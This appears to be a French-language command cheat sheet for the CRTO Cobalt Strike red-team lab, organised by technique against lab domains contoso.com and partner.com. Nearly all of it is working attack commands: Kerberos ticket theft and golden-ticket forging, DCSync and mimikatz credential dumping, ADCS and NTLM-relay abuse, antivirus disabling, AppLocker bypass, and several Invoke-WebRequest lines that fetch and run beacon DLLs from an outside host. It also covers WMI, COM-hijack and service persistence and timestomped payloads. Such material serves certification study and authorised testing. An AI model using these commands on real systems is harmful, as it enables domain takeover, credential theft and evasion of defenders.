# Bibliothèque de commandes CRTO — Red Team Ops et Cobalt Strike  

## Commandes par technique  

## PowerShell  

>Ajouter une entrée au fichier hosts de l’Attacker Desktop pour la résolution DNS interne OPSEC-🟢SAFE  
```powershell
Add-Content -Path C:\Windows\System32\drivers\etc\hosts -Value "10.10.120.1 lon-dc-1 lon-dc-1.contoso.com contoso.com"
```
>Enregistrer sur l’Attacker Desktop le ticket `.kirbi` obtenu avec `krb_s4u` ou `krb_dump` OPSEC-🟢SAFE  
>Enregistrer et décoder les tickets depuis PowerShell sur l’Attacker Desktop avant `kerberos_ticket_use`  
```powershell
[System.IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\rsteel_cifs.kirbi", [System.Convert]::FromBase64String("<base64>"))
[System.IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\rsteel_http.kirbi", [System.Convert]::FromBase64String("<base64>"))
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\rsteel.kirbi", [Convert]::FromBase64String("[B64]"))
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\cifs-lon-fs-1.kirbi", [Convert]::FromBase64String("[B64]"))
```
>Enregistrer le certificat de l’autorité de certification sur l’Attacker Desktop.
```powershell
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\lon-cs-1.pfx", [Convert]::FromBase64String("[CERT]"))
```
>Examiner l’utilisation du certificat pour demander un certificat utilisateur dans le lab OPSEC-🟢SAFE
```powershell
C:\Tools\Certify\Certify\bin\Release\Certify.exe forge --ca-cert .\Desktop\lon-cs-1.pfx --upn Administrator --subject CN=Administrator,CN=Users,DC=contoso,DC=com --sid S-1-5-21-3926355307-1661546229-813047887-500 --crl ldap:///CN=CONTOSO Root CA,CN=lon-cs-1,CN=CDP,CN=Public Key Services,CN=Services,CN=Configuration,DC=CONTOSO,DC=com
```
>Convertir un certificat PFX du lab en Base64 pour son utilisation avec `Rubeus asktgt`  
```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Tools\LON-DC-1.pfx"))
```
>Étudier la désactivation de l’analyse antivirus en temps réel dans le lab OPSEC-🟠CAUTION  
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```
>Énumérer les mauvaises configurations AppLocker de la workstation initiale  
```powershell
# Confirm AppLocker is enforcing (ConstrainedLanguage = active)
$ExecutionContext.SessionState.LanguageMode

# Read all effective rules
$policy = Get-AppLockerPolicy -Effective
$policy.RuleCollections

# Check if DLL rules are enforced — empty output = DLL rules OFF = rundll32 viable 💡
$policy.RuleCollections | Where-Object { $_.RuleCollectionType -eq 'Dll' }

# Find writable dirs inside the allowed %WINDIR%\* path
icacls C:\Windows\Tasks
icacls C:\Windows\Temp
```

## PowerView PowerShell  

>OPSEC-🟢SAFE  
>Charger PowerView dans le contexte du Beacon sans copie explicite sur le disque de la cible  
```cs
ipmo C:\Tools\PowerSploit\Recon\PowerView.ps1
```
>Importer PowerView depuis une fenêtre PowerShell sur l’Attacker Desktop
```powershell
ipmo C:\Tools\PowerSploit\Recon\PowerView.ps1
```
>Rechercher les comptes disposant de `WriteProperty` sur l’attribut `msDS-AllowedToActOnBehalfOfOtherIdentity` des ordinateurs.
```powershell
Get-DomainComputer -Server 'lon-dc-1' | Get-DomainObjectAcl -Server 'lon-dc-1' | ? { $_.ObjectAceType -eq '3f78c3e5-f79a-46bd-a0b8-9d18116ddc79' -and $_.ActiveDirectoryRights -eq 'WriteProperty' } | select ObjectDN,SecurityIdentifier
```
>Interroger LDAP pour identifier l’objet associé à un SID 
```
Get-DomainObject -LDAPFilter '(objectSid=S-1-5-21-3926355307-1661546229-813047887-1107)' -Server 'lon-dc-1'
```
>Commandes d’énumération PowerView  
```
powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
 
powerpick Get-Domain
powerpick Get-DomainUser -Properties samaccountname,description
powerpick Get-DomainGroupMember "Domain Admins" -Recurse
```

## RSAT PowerShell  

>Énumération AD à lancer dans la fenêtre PowerShell `runas` contenant le ticket LDAP, avec RSAT installé  
```powershell
Get-ADComputer -Filter * -Server lon-dc-1
# Find existing Resource Based Constrained Delegation (RBCD) config 
Get-ADComputer -Filter * -Properties PrincipalsAllowedToDelegateToAccount -Server 'lon-dc-1' | select Name,PrincipalsAllowedToDelegateToAccount

Get-ADUser -Filter * -Server lon-dc-1
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName -Server lon-dc-1

Get-ADOrganizationalUnit -Filter * -Server lon-dc-1

Get-ADGroup -Filter * -Server lon-dc-1
Get-ADGroupMember "Domain Admins" -Server lon-dc-1 -Recursive

Get-ADTrust -Filter * -Server lon-dc-1

Get-GPO -All -Server lon-dc-1   # requires GroupPolicy module, pre-loaded in lab
```
>Ajouter la configuration RBCD du lab sans écraser l’entrée existante.
```powershell
$ws1 = Get-ADComputer -Identity 'lon-ws-1' -Server 'lon-dc-1'
$wkstn1 = Get-ADComputer -Identity 'lon-wkstn-1' -Server 'lon-dc-1'
Set-ADComputer -Identity 'lon-fs-1' -PrincipalsAllowedToDelegateToAccount $ws1,$wkstn1 -Server 'lon-dc-1'
```

## PowerShell-Import  

>OPSEC-🟠CAUTION
>Charger `WmiPersistence.ps1` avec `powershell-import`, puis appeler la fonction depuis le Beacon  
>Étudier les abonnements WMI liés à l’événement 1502 de rafraîchissement GPO **Elevated persistence**  
```cs
powershell-import C:\Tools\WmiPersistence.ps1
psinject [BEACON PID] x64 Add-WmiPersistence
```

## Beacon initial  

>OPSEC-🟢SAFE  
>Configurer un sleep de 3 secondes et un jitter de 20 %  
```cs
sleep 3 20
```
>Ouvrir le navigateur de processus du Beacon courant  
```cs
process_browser
```
>Configurer le processus parent (PPID)  
```cs
ppid <explorer.exe PID>
```
>Afficher l’identité du compte courant  
```cs
getuid
```
>Afficher le répertoire de travail  
```cs
pwd
```
>Lister les processus dans la console du Beacon  
```cs
ps
```
>Rechercher le Domain Controller du domaine distant.
```cs
nslookup _ldap._tcp.dc._msdcs.partner.com 10.10.120.1 SRV
```

## Usurpation d’identité (User Impersonation)  

>OPSEC-🟢SAFE
>Utiliser le token Windows d’un utilisateur depuis son processus  
```
steal_token 1234
```
>Afficher les tickets Kerberos accessibles avec Kerberos Triage  
```cs
krb_triage
```
>Exporter le ticket TGT d’une session utilisateur depuis un Beacon disposant des droits nécessaires 
```cs
krb_triage
krb_dump /user:rsteel /service:krbtgt
```
>Exporter le TGT du compte machine depuis un Beacon SYSTEM de haute intégrité  
```
krb_dump /luid:3e7 /service:krbtgt
```
>Examiner le TGT de l’utilisateur courant depuis un Beacon de moyenne intégrité  
```cs
krb_tgtdeleg
```
>Terminer l’impersonation après les vérifications
```
rev2self
```

## ldapsearch    

>OPSEC-🟢SAFE  
>Énumérer le domaine, les OU et les GPO, ainsi que leurs ACL pour BloodHound  
```
ldapsearch (|(objectClass=domain)(objectClass=organizationalUnit)(objectClass=groupPolicyContainer)) --attributes *,ntsecuritydescriptor
```
>Énumérer les utilisateurs, ordinateurs, groupes et leurs ACL  
```
ldapsearch (|(samAccountType=805306368)(samAccountType=805306369)(samAccountType=268435456)) --attributes *,ntsecuritydescriptor
```
>Récupérer les informations des GPO
```
ldapsearch (objectClass=groupPolicyContainer) --hostname par-dc-1.partner.com --dn DC=partner,DC=com --attributes displayName,gPCFileSysPath
```
>Énumérer le conteneur Foreign Security Principals du domaine distant.
```cs
ldapsearch (objectClass=foreignSecurityPrincipal) --attributes objectSid,memberOf --hostname partner.com --dn DC=partner,DC=com
```
>Récupérer le SID du domaine enfant dans la forêt.
```
ldapsearch (objectClass=domain) --hostname lon-dc-1 --dn DC=dublin,DC=contoso,DC=com --attributes objectSid
```
>Récupérer le SID du groupe Enterprise Admins du domaine parent.  
```
ldapsearch "(&(samAccountType=268435456)(samAccountName=Enterprise Admins))" --hostname lon-dc-1 --dn DC=contoso,DC=com --attributes objectSid
```
>Énumérer les membres du groupe `Partner Jump Users`.  
```cs
ldapsearch "(&(|(samAccountType=805306368)(samAccountType=268435456))(memberof=CN=Partner Jump Users,CN=Users,DC=contoso,DC=com))" --attributes distinguishedName
```
>Énumérer en une requête les utilisateurs, ordinateurs et groupes  
```cs
ldapsearch (|(samAccountType=805306368)(samAccountType=805306369)(samAccountType=268435456)) --attributes *,ntsecuritydescriptor,samaccountname,memberof,admincount,servicePrincipalName,dNSHostName,operatingSystem
```
>Identifier les groupes associés au rôle `sysadmin` de SQL Server  
```
ldapsearch (&(samAccountType=268435456)(|(name=*SQL*)(name=*DB*)(name=*Database*))) --attributes distinguishedName,member
```
>Énumérer les ordinateurs  
```cs
ldapsearch (samAccountType=805306369) --attributes name,dnsHostName,operatingSystem
```
>Énumérer les relations de confiance parent-enfant, entrantes et sortantes  
```
ldapsearch (objectClass=trustedDomain) --attributes trustPartner,trustDirection,trustAttributes,flatName
```
>Identifier les comptes ne nécessitant pas de préauthentification Kerberos  
```
ldapsearch (&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)) --attributes samAccountName
```
>Énumérer les configurations Constrained Delegation  
```
ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo,userAccountControl
```
>Énumérer les objets disposant d’une Unconstrained Delegation  
```
ldapsearch (userAccountControl:1.2.840.113556.1.4.803:=524288) --attributes samAccountName,servicePrincipalName,userAccountControl
```
>Énumérer la structure du domaine : OU et GPO  
```
ldapsearch (|(objectClass=domain)(objectClass=organizationalUnit)(objectClass=groupPolicyContainer)) --attributes *,ntsecuritydescriptor
```

## Opérations sur les fichiers avec Beacon  

>OPSEC-🟢SAFE  
>Copier les journaux Beacon vers l’Attacker Desktop via Ubuntu dans Windows Terminal  
```bash
cd /mnt/c/Users/Attacker/Desktop
scp -r attacker@10.0.0.5:/opt/cobaltstrike/logs .
```
>Transférer le fichier du lab depuis l’Attacker Desktop vers le dossier de travail du Beacon   
```cs
cd C:\Windows\Tasks\
upload C:\Payloads\http_x64.svc.exe
```
>Récupérer le template de sécurité GPO `GptTmpl.inf`, consulter les groupes et synchroniser le fichier.
```cs
download \\partner.com\SysVol\partner.com\Policies\{DFE606B4-CA59-4AD6-9BCE-55AF35888129}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
```
>Supprimer le fichier temporaire du lab
```cs
rm C:\Temp\http_x64.svc.exe
```
>Accéder au partage administratif C$ via SMB OPSEC-🟢SAFE
```cs
ls \\par-jmp-1.partner.com\c$
```
>Copier le certificat depuis le conteneur Docker Kali Linux vers Windows :
```
docker cp kali-1:/LON-DC-1.pfx C:\Tools\LON-DC-1.pfx
```
>Vérifier les droits Domain Admin
```
ls \\lon-dc-1.contoso.com\C$
```
>Transférer puis renommer le fichier du lab depuis un Beacon SYSTEM.
```
upload C:\Payloads\dns_x64.exe
mv dns_x64.exe windbg.exe
```
>Examiner le renommage et la modification des timestamps de la DLL de l’exercice.  
```
cd C:\Users\pchilds\AppData\Local\Microsoft\TeamsMeetingAdd-in\1.25.14205\x64
upload C:\Payloads\http_x64.dll

mv http_x64.dll Microsoft.Teams.HttpClient.dll
timestomp Microsoft.Teams.HttpClient.dll Microsoft.Teams.Diagnostics.dll
```
>Examiner les entrées du registre liées au COM Hijacking dans le scénario Teams  
```powershell
reg_set HKCU "Software\Classes\CLSID\{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}\InprocServer32" "" REG_EXPAND_SZ "%LocalAppData%\Microsoft\TeamsMeetingAdd-in\1.25.14205\x64\Microsoft.Teams.HttpClient.dll"
reg_set HKCU "Software\Classes\CLSID\{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}\InprocServer32" "ThreadingModel" REG_SZ "Both"
```

## Ubuntu WSL & Kali Linux  

>Analyser les journaux avec BOFHound sous Ubuntu WSL, puis transférer le JSON vers BloodHound OPSEC-🟢SAFE
```
bofhound -i logs
```
>Compiler les artifacts dans Ubuntu WSL, puis charger `artifact.cna` dans Script Manager  
```bash
cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact

./build.sh mailslot VirtualAlloc 351363 0 false false none /mnt/c/Tools/cobaltstrike/custom-artifacts
```
>Compiler les templates du Resource Kit sous Ubuntu WSL  
```bash
cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/resource
./build.sh /mnt/c/Tools/cobaltstrike/custom-resources
```
>Configurer le lab de Relay via le conteneur Kali Docker et les paramètres de proxychains  
```
docker container start -i kali-1

nano /etc/proxychains.conf
# socks5 10.0.0.5 1080

proxychains impacket-ntlmrelayx -t http://10.10.120.5/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```
>Utiliser `PackMyPayload.py` sous Ubuntu WSL pour produire des archives ISO, IMG ou ZIP  
```
python3 /mnt/c/Tools/PackMyPayload/PackMyPayload.py -H deals.xlsx,ngentask.exe,AppDomainHijack.dll /mnt/c/Payloads/deals/ /mnt/c/Payloads/deals/deals.iso
```

## ThreatCheck & Ghidra  

>Ouvrir Ghidra
```
ghidraRun.bat
```
>Tester le template PowerShell du Resource Kit avec ThreatCheck (AMSI)  
```powershell
cd C:\Tools\cobaltstrike\custom-resources\
C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f .\template.x64.ps1 -e AMSI -t Script
```
>Vérifier avec ThreatCheck l’artifact EXE du lab créé avec mailslot  
```powershell
C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f "C:\tools\cobaltstrike\custom-artifacts\mailslot\artifact64big.exe"
```
>Contrôler le résultat de l’analyse des artifacts avant le déploiement du lab.
```
C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Tools\WmiPersistence.ps1
```
>Contrôler avec ThreatCheck la DLL de l’exercice compilée dans Visual Studio  
```powershell
C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f "C:\Users\Attacker\source\repos\AppDomainHijack\bin\Release\AppDomainHijack.dll"
```

## Établir un Beacon  

>Dans le scénario Assume Breach, examiner `AppDomainHijack.dll` et `ngentask` sur la workstation du lab  
```powershell
# On foothold workstation — set APPDOMAIN env vars and run ngentask
cd C:\Windows\Tasks\

Invoke-WebRequest -Uri 'http://www.bleepincomputer.com/AppDomainHijack.dll' -OutFile 'C:\Windows\Tasks\AppDomainHijack.dll'
cp C:\Windows\WinSxS\amd64_netfx4-ngentask_exe_b03f5f7f11d50a3a_4.0.15805.0_none_d4039dd5692796db\ngentask.exe C:\Windows\Tasks\

$env:APPDOMAIN_MANAGER_TYPE = 'AppDomainHijack.DomainManager'
$env:APPDOMAIN_MANAGER_ASM  = 'AppDomainHijack, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null'
.\ngentask.exe
```
>Télécharger la DLL Beacon dans le scénario AppLocker `ConstrainedLanguage` avec `Invoke-WebRequest`   
```powershell
cd C:\Windows\Tasks\
Invoke-WebRequest -Uri 'http://www.bleepincomputer.com/beacon.dll' -OutFile 'C:\Windows\Tasks\beacon.dll'
rundll32.exe C:\Windows\Tasks\beacon.dll,StartW
```
>Contrôles après la connexion du Beacon
```
sleep 3 20
ps
process_browser
ls / pwd / drives
ppid <explorer.exe PID>
getuid
netstat 
```

## Rubeus

>OPSEC-🟠CAUTION  
>Étudier S4U2Self et le ticket de service CIFS pour `lon-fs-1` dans le lab  
```powershell
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-wkstn-1$ /impersonateuser:Administrator /msdsspn:cifs/lon-fs-1 /ticket:[TGT] /dc:lon-dc-1 /outfile:C:\Users\Attacker\Desktop\
```
>Examiner le fonctionnement de Rubeus et de la délégation Kerberos sans contrainte  
```cs
spawnto x64 %windir%\sysnative\dllhost.exe
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe tgtdeleg /nowrap
```
>Examiner les valeurs de hash Kerberos du compte `mssql_svc` dans le lab  
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:mssql_svc /nowrap
```
>Depuis la fenêtre PowerShell `runas`, demander un ticket LDAP et examiner Pass-the-Ticket  
```powershell
runas /netonly /user:CONTOSO\pchilds powershell

C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:ldap/lon-dc-1 /ticket:[ENCODED TGT] /dc:lon-dc-1 /ptt
```
>Dans ce lab, examiner les tickets de la session `/netonly` avec Rubeus  
```
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe klist
```
>Examiner le mode de surveillance Rubeus des tickets reçus dans le scénario SSPI  
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval:3 /targetuser:lon-dc-1$ /nowrap
```
>Examiner la demande d’un TGT au moyen d’un certificat utilisateur  
```cs
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:Administrator /domain:CONTOSO.COM /certificate:[CERT] /enctype:aes256 /nowrap
```
>Vérifier les droits du ticket Kerberos dans la session Beacon du lab  
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:[BASE64_TGT]
```
>Scénario Golden Ticket de l’Attacker Desktop, avec fichier de sortie `.kirbi`.  
```
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /user:Administrator /domain:dublin.contoso.com /sid:S-1-5-21-690277740-3036021016-2883941857 /sids:S-1-5-21-3926355307-1661546229-813047887-519 /aes256:2eabe80498cf5c3c8465bb3d57798bc088567928bb1186f210c92c1eb79d66a9 /outfile:C:\Users\Attacker\Desktop\golden
```

## kerberos_ticket_use

>OPSEC-🟢SAFE  
>Créer une session de connexion temporaire et importer le ticket du lab  
```cs
make_token CONTOSO\rsteel FakePass
kerberos_ticket_use C:\Users\Attacker\Desktop\rsteel.kirbi
```
>Examiner l’utilisation d’un ticket HTTP avec WinRM vers `par-jmp-1`  
```cs
kerberos_ticket_use C:\Users\Attacker\Desktop\rsteel_http.kirbi

jump winrm64 par-jmp-1.partner.com smb
```
>Importer le ticket CIFS du lab et vérifier la session  
```cs
kerberos_ticket_use C:\Users\Attacker\Desktop\rsteel_cifs.kirbi
```
>Étudier le remplacement du TGT courant de `sguest` par le ticket du lab.  
```
kerberos_ticket_use C:\Users\Attacker\Desktop\[GOLDEN TICKET].kirbi
```

## PowerPick  

>OPSEC-🟠CAUTION  
>Lister les tickets Kerberos au moyen de PowerShell non managé  
```
powerpick klist
```
>Énumérer les services Windows dont les ACL accordent `FullControl` à des comptes peu privilégiés  
```cs
powerpick $lowpriv = @('Everyone', 'BUILTIN\Users', 'NT AUTHORITY\Authenticated Users'); ls 'HKLM:\SYSTEM\CurrentControlSet\Services' | % { $acl = Get-Acl $_.PSPath; foreach ($ace in $acl.Access) { if ($ace.AccessControlType -eq 'Allow' -and $ace.IsInherited -eq $false -and $lowpriv -contains $ace.IdentityReference.Value -and $ace.RegistryRights -eq [System.Security.AccessControl.RegistryRights]::FullControl) { [PSCustomObject] @{ServiceName = $_.PSChildName; Identity = $ace.IdentityReference.Value; Rights = $ace.RegistryRights }}}}
```
>Examiner la règle du pare-feu Windows concernant le port 445 dans le lab
```cs
powerpick New-NetFirewallRule -DisplayName "File Sharing" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 445
```
>Énumérer les abonnements WMI avec powerpick   
```cs
powerpick Get-WmiObject -Namespace root/subscription -Class __EventFilter
powerpick Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer
powerpick Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding
```
>Identifier les chemins de services comportant des espaces sans guillemets  
```powershell
powerpick Get-WmiObject -Class Win32_Service | Where-Object { $_.PathName -notmatch '^"' -and $_.PathName -match ' ' -and $_.PathName -notmatch '^[A-Za-z]:\\Windows\\' } | Select-Object Name, PathName, StartMode, StartName
```


## HashCat

>Analyse hors ligne des hashes avec Hashcat
```
hashcat -a 0 -m 13100 /hashcat-cracking/cred-acc-challenge.hash /wordlists/rockyou.txt
```

## S4U  

>Étudier les tickets de service S4U du compte Administrator
```
krb_s4u /ticket:[TGT] /service:cifs/lon-fs-1 /impersonateuser:Administrator
```

## Services Windows  

>OPSEC-🟠CAUTION  
>Relever la configuration courante du service  
```cs
sc_stop BadWindowsService
```
>Examiner la modification du chemin du service dans le lab  
```cs
sc_config BadWindowsService C:\Temp\http_x64.svc.exe 0 2
```
>Démarrer le service  
```cs
sc_start BadWindowsService
```

## KRB_ASKTGT

>OPSEC-🟢SAFE  
>`krb_asktgt` demande un TGT avec le contexte d’authentification approprié  
>Étudier la demande de TGT du compte de confiance avec le secret partagé dans le lab  
```cs
krb_asktgt /user:PARTNER$ /rc4:[TRUST KEY] /domain:contoso.com /dc:lon-dc-1.contoso.com
```
>Demander un TGT pour `rsteel` auprès du KDC CONTOSO  
```cs
krb_asktgt /user:rsteel /aes256:<aes256_hmac-from-dcsync>
```
>Demander un TGT `rsteel` au KDC CONTOSO  
```cs
krb_asktgt /user:rsteel /aes256:05579261e29fb01f23b007a89596353e605ae307afcd1ad3234fa12f94ea6960
```

## KRB_ASKTGS  

>OPSEC-🟠CAUTION  
>`krb_asktgs` demande un ticket de service à partir d’un TGT disponible.  
>Demander un ticket de référence inter-realm  
```cs
krb_asktgs /service:krbtgt/partner.com /ticket:<base64-TGT>
```
>Demander un ticket CIFS pour `par-jmp-1` auprès du KDC PARTNER  
```cs
krb_asktgs /service:cifs/par-jmp-1.partner.com /targetdomain:partner.com /dc:par-dc-1.partner.com / ticket:<base64-INTER-REALM>
```
>Demander un ticket de service CIFS au KDC PARTNER  
```cs
krb_asktgs /service:cifs/par-jmp-1.partner.com /targetdomain:partner.com /dc:par-dc-1.partner.com /ticket:<base64-INTER-REALM>
```
>Demander le ticket HTTP utilisé par WinRM auprès du KDC PARTNER  
```cs
krb_asktgs /service:http/par-jmp-1.partner.com /targetdomain:partner.com /dc:par-dc-1.partner.com /ticket:<base64-INTER-REALM>
```

## Tunnels et proxy SOCKS  

>OPSEC-🟢SAFE  
>Configurer un proxy SOCKS dans le Beacon, puis définir le profil et les règles Proxifier  
```
socks 1080 socks5
```
>Examiner l’état du service `lanmanserver` dans le lab.
```
sc_config lanmanserver "C:\Windows\system32\svchost.exe -k netsvcs -p" 1 4
```
>Examiner la redirection de port inverse du lab entre le port 445 et `127.0.0.1:7445`
```cs
rportfwd_local 445 localhost 7445
```
>Dépannage du proxy SOCKS dans le Beacon  
```
socks stop
```
>Nettoyage du proxy SOCKS, du pare-feu, des services et des redirections de ports  
```
rportfwd stop 445

sc_config lanmanserver "C:\Windows\system32\svchost.exe -k netsvcs -p" 1 2
sc_start srvnet
sc_start srv2
sc_start lanmanserver

powerpick Remove-NetFirewallRule -DisplayName "File Sharing"
```

## Coerce et Relay  

>OPSEC-🟠CAUTION  
>Examiner l’authentification du DC vers le serveur web dans le scénario  
```cs
spawnto x64 %windir%\sysnative\dllhost.exe
execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe lon-dc-1 lon-ws-1
```
>Étudier le scénario de certificat DomainController avec `NTLMRelayX` dans le conteneur Kali  
```
proxychains impacket-ntlmrelayx -t http://10.10.120.5/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```
>Examiner l’authentification du Domain Controller vers la machine du lab.
```
execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe 10.10.120.1 10.10.121.108
```

## SQL  

>OPSEC-🟢SAFE  
>Afficher les informations SQL et les droits du compte courant  
```cs
sql-info lon-db-1
```
>Vérifier le rôle `sysadmin` avant de poursuivre  
```
sql-whoami lon-db-1
```
>Vérifier l’état de SQL CLR
```cs
sql-query lon-db-1 "SELECT value FROM sys.configurations WHERE name = 'clr enabled'"
```
>SQL CLR doit être activé avant le chargement d’assemblies .NET.  
```cs
sql-enableclr lon-db-1
```
>Charger l’assembly CLR sur SQL Server et exécuter la procédure stockée du lab.
```cs
sql-clr lon-db-1 C:\Users\Attacker\source\repos\MyProcedure\bin\Release\MyProcedure.dll MyProcedure
```
>Le nom de la named pipe du listener SMB est configuré dans **Cobalt Strike > Listeners**. Il est distinct du paramètre `post-ex.pipename` du Malleable C2 Profile.  
>Dans ce scénario, la liaison utilise le Beacon disposant du contexte Kerberos requis pour l’authentification CIFS.  
>Nom de named pipe par défaut du lab : `TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337`  
```cs
// LAB (London SQL)
link lon-db-1 TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337

```
>Lister les Linked Servers configurés sur `lon-db-1`
```cs
sql-links lon-db-1
```
>Vérifier les permissions sur `lon-db-2` via le lien SQL
```cs
sql-whoami lon-db-1 "" lon-db-2
```
>Vérifier et configurer RPC Out sur le lien SQL dans le lab
```cs
sql-checkrpc lon-db-1
sql-enablerpc lon-db-1 lon-db-2
```
>Examiner l’exécution CLR sur `lon-db-2` via le Linked Server
```cs
sql-clr lon-db-1 C:\Users\Attacker\source\repos\MyProcedure\bin\Release\MyProcedure.dll MyProcedure "" lon-db-2
```
>Étudier `SeImpersonatePrivilege` et SweetPotato dans le scénario de lab
```cs
execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p "C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps\tcp-local_x64.exe"
connect localhost 1337
```

## Certify  

>OPSEC-🟠CAUTION  
>Énumération des configurations ADCS ESC  
```cs
execute-assembly C:\Tools\Certify\Certify.exe find /vulnerable
```
>Énumérer les templates ADCS présentant des configurations à examiner  
```cs
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-templates --filter-enabled --filter-vulnerable --hide-admins --quiet
```
>ESC1 — examiner les templates Client Authentication et le champ UPN du SAN
```cs
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request --ca "lon-cs-1.contoso.com\CONTOSO Root CA" --template ESC1 --upn Administrator --quiet
```
>Examiner le certificat de l’autorité de certification sur le serveur CA 
```cs
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe manage-self --dump-certs --quiet
```

## SpawnTo  

>`spawnto x64 <path>` définit le processus temporaire utilisé par les opérations fork-and-run du Beacon courant : `execute-assembly`,`powerpick`. remplace localement le réglage `spawnto_x64` du Malleable C2 Profile pour ce Beacon  
```
spawnto x64 C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
```
>`ak-settings spawnto_x64 <path>` configure le champ spawnto des fichiers service EXE générés par l’Artifact Kit. Concerne :
  `jump scshell64` Lateral Movement  
```cs
ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
```

## DCSync  

>OPSEC-🟠CAUTION  
>Étudier la collecte des tickets et identifiants dans le lab  
```cs
dcsync contoso.com CONTOSO\Administrator
```
>nécessite des droits de réplication AD ; un Beacon utilisateur standard ne suffit pas  
```cs
dcsync contoso.com CONTOSO\krbtgt
```
>Étudier le hash AES256 de `rsteel` récupéré via DCSync dans le lab  
```cs
dcsync contoso.com CONTOSO\rsteel
```

## JUMP  

>Dans ce lab, `scshell64` utilise le binaire service généré par l’Artifact Kit et le paramètre `ak-settings spawnto_x64`.  
```
ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
jump scshell64 lon-dc-1 smb
```
>Étudier le Jump WinRM, sans modification de service dans ce scénario  
>Étudier la création d’un nouveau Beacon via WinRM  
```cs
jump winrm64 lon-dc-1.contoso.com smb
jump winrm64 lon-ws-1 smb
```

## Execute    

>OPSEC-🔴UNSAFE
>Déclencher le rafraîchissement GPO du lab avec `gpupdate.exe` pour observer le comportement   
```cs
execute gpupdate /target:computer /force
```

## Obtenir SYSTEM  

>OPSEC-🔴UNSAFE
>Si l’exercice nécessite une élévation vers SYSTEM  
```cs
getsystem
```

## Mimikatz  

>OPSEC-🔴UNSAFE  
>Examiner le secret de confiance inter-realm associé à l’objet TDO  
```
mimikatz lsadump::dcsync /domain:partner.com /guid:{288d9ee6-2b3c-42aa-bef8-959ab4e484ed}
```

# Commandes des labs CRTO

>Relations de confiance sortantes  
```
ldapsearch (objectClass=trustedDomain) --attributes trustDirection,trustPartner,trustAttributes,flatName
ldapsearch (objectClass=trustedDomain) --attributes name,objectGUID

mimikatz lsadump::dcsync /domain:partner.com /guid:{288d9ee6-2b3c-42aa-bef8-959ab4e484ed}

krb_asktgt /user:PARTNER$ /rc4:[TRUST KEY] /domain:contoso.com /dc:lon-dc-1.contoso.com

ldapsearch (objectClass=domain) --hostname contoso.com --dn DC=contoso,DC=com --attributes name,objectSid
```

>Relations de confiance entrantes
```
ldapsearch (objectClass=trustedDomain) --attributes trustDirection,trustPartner,trustAttributes,flatname
ldapsearch (objectClass=foreignSecurityPrincipal) --attributes objectSid,memberOf --hostname partner.com --dn DC=partner,DC=com
ldapsearch (objectSid=S-1-5-21-3926355307-1661546229-813047887-6102) --attributes samAccountType,distinguishedName
ldapsearch "(&(|(samAccountType=805306368)(samAccountType=268435456))(memberof=CN=Partner Jump Users,CN=Users,DC=contoso,DC=com))" --attributes distinguishedName

nslookup _ldap._tcp.dc._msdcs.partner.com 10.10.120.1 SRV

ldapsearch (objectClass=groupPolicyContainer) --hostname par-dc-1.partner.com --dn DC=partner,DC=com --attributes displayName,gPCFileSysPath

download \\partner.com\SysVol\partner.com\Policies\{DFE606B4-CA59-4AD6-9BCE-55AF35888129}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf

ldapsearch (objectSid=S-1-5-21-4244029708-1901239654-2578485347-1104) --hostname par-dc-1.partner.com --dn DC=partner,DC=com --attributes samAccountType,samAccountName,member
